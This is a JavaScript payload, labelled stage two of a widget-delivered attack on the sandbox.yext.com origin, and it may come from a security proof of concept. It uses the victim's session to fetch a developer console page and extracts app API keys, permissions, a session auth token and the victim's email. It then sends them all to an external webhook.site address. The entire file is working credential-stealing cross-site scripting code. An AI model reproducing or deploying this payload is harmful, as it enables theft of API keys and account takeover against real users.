// STAGE 2 - runs in the sandbox.yext.com origin via the widget payload.
(function(){
  var WH="https://webhook.site/75488932-a110-4fa0-8c3d-fd6f4a3874e0";
  function send(o){
    fetch(WH+"?stage="+o.stage+"&keys="+(o.key_count||0)+"&apps="+(o.app_count||0),
      {method:"POST",headers:{"Content-Type":"text/plain"},body:JSON.stringify(o,null,1)});
  }
  fetch("/s/2394434/developerconsole/",{credentials:"include",redirect:"follow"})
    .then(function(r){ return r.text().then(function(t){ return {t:t,r:r}; }); })
    .then(function(x){
      var t=x.t, r=x.r;
      var out={stage:"3_full_apikeys",origin:location.origin,delivery_url:location.href,
               fetch_status:r.status, fetch_url:r.url, redirected:r.redirected,
               page_bytes:t.length, apps:[], keys:[]};
      // diagnostics so a failure is self-explaining
      var ti=t.match(/<title>([\s\S]{0,120}?)<\/title>/i);
      out.page_title = ti ? ti[1].replace(/\s+/g," ").trim() : null;
      out.looks_like_login = /log ?in|sign ?in|password|Error \(4\d\d\)/i.test(t);
      out.head_snippet = t.slice(0,300);
      out.has_appsJson = t.indexOf("appsJson") !== -1;
      try{
        var m=t.match(/"appsJson":\s*"((?:[^"\\]|\\.)*)"/);
        if(!m){ out.error="appsJson not found in page"; send(out); return; }
        var apps=JSON.parse(JSON.parse('"'+m[1]+'"')).apps;   // parse TWICE
        apps.forEach(function(a){
          var perms=[];
          (a.permissions||[]).forEach(function(p){
            (p.endpoints||[]).forEach(function(e){
              if(e.enabled) perms.push(p.apiGroupName+"/"+e.displayName);
            });
          });
          out.apps.push({id:a.id,name:a.name,apiKeys:a.apiKeys,write:a.hasWriteAccess,perms:perms});
          (a.apiKeys||[]).forEach(function(k){ out.keys.push(k); });
        });
        out.app_count=apps.length; out.key_count=out.keys.length;
        out.write_apps=out.apps.filter(function(a){return a.write;}).length;
      }catch(e){ out.error=String(e); }
      try{
        var d=new DOMParser().parseFromString(t,"text/html");
        var at=d.getElementById("js-storm-navigation-auth-token");
        var em=d.getElementById("js-storm-navigation-user-email");
        if(at) out.session_AT=at.value;
        if(em) out.victim_email=em.value;
      }catch(e){}
      send(out);
    })
    .catch(function(e){
      send({stage:"3_fetch_failed",origin:location.origin,delivery_url:location.href,error:String(e)});
    });
})();
